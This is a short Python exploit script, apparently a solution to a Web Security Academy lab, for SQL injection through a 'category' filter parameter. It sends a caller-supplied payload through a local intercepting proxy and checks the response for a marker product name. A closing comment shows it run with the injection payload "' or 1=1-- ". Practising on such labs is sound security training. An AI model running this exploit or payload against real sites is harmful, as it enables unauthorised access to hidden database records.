#SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

import requests
import sys
import urllib3

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def exploit_sqli(url, payload):
    uri = '/filter?category='
    r = requests.get( url + uri + payload, verify=False, proxies=proxies)
    if "Brain Power" in r.text:
        return True
    else:
        return False


if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        payload = sys.argv[2].strip()
    except IndexError:
        print("[-] Usage: %s <url> <payload>" %sys.argv[0])
        print('[-] Example: %s www.example.com "1=1" ' % sys.argv[0])
        sys.exit(-1)

    if exploit_sqli(url, payload):
        print("[+] SQL injection successful! ")
    else:
        print("[-] SQL injection unsuccessful!")

#How to run the output
#python3 sqli-lab-01.py https://0abf00df03ca158cc3e6dd14009a00fa.web-security-academy.net/ " ' or 1=1-- "
